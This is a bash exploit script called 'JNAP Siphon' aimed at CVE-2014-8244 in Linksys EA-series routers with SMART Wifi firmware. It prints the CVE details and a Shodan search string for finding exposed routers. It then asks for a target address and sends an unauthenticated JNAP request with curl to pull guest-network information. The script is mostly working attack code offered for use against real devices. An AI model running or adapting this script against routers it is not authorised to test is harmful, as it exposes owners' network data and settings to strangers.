#!/usr/bin/env bash

NON=$(echo -e "\e[0;0;0m")  #Revert fonts to standard color
REDB=$(echo -e "\e[1;91m")  #Alter fonts to red bold
GRNB=$(echo -e "\e[1;92m")  #Alter fonts to green bold
GRN=$(echo -e "\e[1;32m")  #Alter fonts to green bold
BLU=$(echo -e "\e[1;97m")  #Alter fonts to blue normal
YEL=$(echo -e "\e[1;99m")  #Alter fonts to blue bold
############################################################################
echo ''
echo ''
echo $REDB"===============================================$NON"
echo $REDB"------------JNAP Siphon 0.1c-------------------$NON"
echo $REDB"===============================================$NON"
echo ''
echo -e $YEL"CVE-2014-8244 - Devices - EA2700, EA3500, E4200v2, EA4500, EA6200, EA6300, EA6400, EA6500, EA6700 and EA6900\n\tOn Linksys EA series Routers with SMART Wifi firmware, certain JNAP HTTP requests can allow remote attackers to obtain sensitive information or even modify data. How much information??? Let's see....\n\n\tShodan search - title:'Linksys SMART'\n\thttp://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-8244\n\tDisclosed November, 2014 $NON"
echo ''
echo ''
############################################################################
read -p $BLU"Enter the target Smart Linksys Router (w/o trailing slash - http://10.0.0.1): $NON" T
echo ""
echo $GRNB"Target is set to:$NON$BLU $T $NON"
############################################################################
echo -e $GRNB"=================================================================================$NON"
echo ''
echo -e $BLU"Checking for Guest Network....$NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/guestnetwork/GuestNetwork"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
